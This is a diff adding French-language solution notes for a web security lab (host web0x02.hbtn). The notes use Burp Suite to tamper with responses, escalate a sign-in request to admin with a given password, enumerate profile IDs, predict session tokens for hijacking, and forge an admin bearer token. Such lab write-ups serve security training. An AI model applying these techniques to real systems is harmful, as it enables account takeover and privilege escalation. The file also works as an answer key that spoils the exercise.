@@ -1,0 +1,115 @@
+task2:
+
+HTTP/1.1 200 OK
+
+Server: nginx/1.22.1
+
+Date: Tue, 23 Apr 2024 10:42:55 GMT
+
+Content-Type: application/json
+
+Content-Length: 128
+
+Connection: close
+
+Vary: Cookie
+
+
+
+{"message":{"payment_status":"unpaid","refresh_token":"479c88ed36e0b10b3f1983fec1b88619"},"success":false,"username":"MarcP70"}
+
+Modifier comme suit:
+{"message":{"payment_status":"paid","refresh_token":"479c88ed36e0b10b3f1983fec1b88619"},"success":true,"username":"MarcP70"}
+
+
+Task3:
+
+POST /api/task3/signin HTTP/1.1
+
+Host: web0x02.hbtn
+
+Cookie: session=vPkCjQIe6ARteF3LTYLpgE3YOhn8kvKZtdTUAJJnKuA.4RfdW4k2jlpq98Jyhrr3odsb80E
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Referer: https://web0x02.hbtn/task3/
+
+Content-Type: application/json
+
+Content-Length: 67
+
+Origin: https://web0x02.hbtn
+
+Sec-Fetch-Dest: empty
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Site: same-origin
+
+Te: trailers
+
+Connection: close
+
+
+
+{"username":"user","password":"user","role":"user","remember_me":0}
+
+Modifier comme suit:
+{"username":"admin","password":"Michelangelo","role":"admin","remember_me":1}
+
+{"username":"admin","password":"Michelangelo","role":"admin","remember_me":1}
+
+
+Task4:
+GET /api/task4/profile/58263997 HTTP/1.1
+
+Host: web0x02.hbtn
+
+Cookie: session=vPkCjQIe6ARteF3LTYLpgE3YOhn8kvKZtdTUAJJnKuA.4RfdW4k2jlpq98Jyhrr3odsb80E
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Referer: https://web0x02.hbtn/task4/
+
+Sec-Fetch-Dest: empty
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Site: same-origin
+
+Te: trailers
+
+Connection: keep-alive
+
+Envoyer dans intruder, tester de 58263997 +100, lancer l'analyse pour avoir un statut 200.
+
+Task5:
+Intercepter -> repeter -> suppimer la valeur de hijack_session -> Sequencer
+Settings: “Throttle between requests (ms)” to 25
+generate around 200 tokens before halting the capture
+Copier et inspecter les lignes, elles vont de 5 en 5 et il en manque une.
+Un fois trouvé aller dans le cookie de session sur le site web, appliquer le cookie, actualiser la page puis gratter entièrement l'image.
+
+Task6:
+Intercepter -> Selectionner le token bearer -> Decoder ->
+In the Decoder tab, follow these steps to decode and modify the token:
+Decode the token from Base64.
+Decompress the decoded data (GZIP).
+You should now see a JSON object with an "admin": false value.
+Edit the JSON to change "admin": false to "admin": true.
+Compress the modified JSON using GZIP.
+Encode the compressed data back to Base64.
+
+Copier le nouveau bearer dans Proxy puis send.
